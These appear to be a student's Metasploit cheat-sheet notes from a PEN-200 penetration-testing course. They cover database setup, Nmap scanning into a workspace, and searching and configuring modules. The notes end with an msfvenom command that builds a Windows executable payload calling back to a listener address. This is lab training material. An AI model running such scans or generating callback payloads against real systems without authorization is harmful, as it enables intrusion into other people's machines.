## metasploit

For basic DB setup (these shouldn't need to be run every time):
```bash
sudo msfdb init
```
```bash
sudo systemctl enable postgresql
```
To start our console session:
```bash
sudo msfconsole
```
```bash
workspace -a pen200-exercises
```
To run an Nmap scan and put the results in a MSF queryable DB:
```bash
db_nmap -A <target IP>
```
To query the results committed to the DB in our current workspace:
```bash
hosts
services
services -p <port of interest>
```
To query auxiliary modules in MSF:
```bash
search type:auxiliary <insert thing of interest>
```
To use a module that you've discovered pass its path or number to `use`:
```bash
use 1337
```
Within that we can discover more about the module we have in hand via:
```bash
info
show options
```
To specify the value of an option:
```bash
set <option name> <value>
```
To void that selection:
```bash
unset <option name>
```
When options are ready:
```bash
run
```

### msfvenom
Courtesy of `venom` payloads can be exported from the Metasploit Framework to be used as we see fit, so we aren't bound to the console. To discover payloads:
```bash
msfvenom -l payloads --platform windows --arch x64
```
To adapt one to our needs:
```bash
msfvenom -p <payload name> LHOST=192.168.45.175 LPORT=4444 -f exe -o uberPwnage.exe
```

